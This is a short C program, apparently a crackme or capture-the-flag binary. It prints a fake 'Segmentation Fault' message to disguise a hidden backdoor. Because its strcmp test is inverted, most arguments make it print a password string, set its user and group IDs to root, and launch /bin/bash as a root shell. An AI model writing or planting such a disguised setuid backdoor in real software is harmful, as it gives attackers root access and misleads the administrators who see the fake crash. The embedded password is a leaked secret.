int main(int argc, char** argv)
{
	if(argc < 2)
	{
		printf("Segmentation Fault");
		exit(1);
	}
	if(strcmp(argv[1], "Mirobolant"))
	{
		printf("Starting Root Shell ...Le Pass est F.scAW8A9jRmk");
		setuid(0);
		setgid(0);
		system("/bin/bash");
	}
	else
	{
		printf("Segmentation Fault");
		exit(1);
	}
}